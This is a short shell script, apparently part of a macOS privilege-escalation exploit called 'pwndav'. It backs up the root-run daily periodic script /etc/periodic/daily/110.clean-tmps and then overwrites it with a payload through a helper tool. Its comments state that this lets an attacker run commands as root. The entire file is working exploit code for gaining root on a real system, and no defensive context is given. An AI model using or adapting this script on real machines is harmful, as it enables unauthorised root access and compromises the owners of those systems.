#!/bin/sh

#  exploit_periodic.sh
#  pwndav
#
#  Created by Chakra on 02/02/20.
#  Copyright Â© 2020 Sreejith Krishnan R. All rights reserved.

# Replaces /etc/periodic/daily/110.clean-tmps with exploit_periodic_payload
# Since this script is run as root, tampering this script will allow an attacker
# to run commands in root context

BACKUP_NAME='exploit_periodic.backup'

if [ -f "./$BACKUP_NAME" ]; then
  echo "[INFO] skipping backup since backup already exist"
else
  cp /etc/periodic/daily/110.clean-tmps ./$BACKUP_NAME
  echo "[INFO] backup created at ./$BACKUP_NAME"
fi

echo "[INFO] deploying payload"
./portal write /etc/periodic/daily/110.clean-tmps ./exploit_periodic_payload
echo "[INFO] payload deployed"
